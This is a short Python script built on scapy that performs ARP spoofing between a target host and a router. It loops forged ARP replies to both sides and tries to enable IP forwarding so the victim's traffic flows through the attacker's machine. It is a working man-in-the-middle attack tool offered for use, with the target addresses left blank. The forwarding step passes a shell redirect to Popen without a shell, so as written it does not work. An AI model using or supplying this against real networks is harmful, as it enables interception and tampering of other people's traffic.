#!/usr/bin/bash python
#If middle pc is the router/spoofip response back to target
import scapy.all as s
import time
import subprocess

def get_mac(ip):
    arp_request = s.ARP(pdst=ip)
    broadcast = s.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = s.srp(arp_request_broadcast, iface="eth0", timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
   
def spoof(targetip,spoofip):

    targetmac = get_mac(targetip)

    packet = s.ARP(op=2,pdst=targetip, hwdst=targetmac, psrc=spoofip )
    s.send(packet)

#Port forwarding so target can still use internet
bashCommand = "echo 1 > /proc/sys/net/ipv4/ip_forward"
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()

targetip=""
spoofip=""

while True:
    #First to client
    spoof(targetip, spoofip)

    #Second to router/spoof
    spoof(spoofip, targetip)
    time.sleep(2)